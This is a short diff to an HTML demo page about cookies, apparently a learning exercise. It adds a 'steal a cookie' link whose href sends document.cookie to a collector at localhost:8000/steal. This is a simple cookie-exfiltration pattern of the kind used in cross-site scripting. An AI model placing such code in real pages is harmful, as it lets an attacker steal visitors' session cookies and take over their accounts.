@@ -7,10 +7,16 @@
 </head>
 <body>
    <button id="create_cookie">Create Cookie</button> 
+   <a href="https://example.com/">click me to go to example.com</a>
+   <br>
+   <a id="steal">steal a cookie</a>
 
    <script>
     const create_cookie=document.getElementById("create_cookie");
-    create_cookie.addEventListener("click", e => document.cookie="cookie1=am a cookie")
+    create_cookie.addEventListener("click", e => document.cookie="cookie1=am a cookie");
+
+    const steal=document.getElementById("steal");
+    steal.href=`http://localhost:8000/steal?v=${document.cookie}`
    </script>
 </body>
 </html>
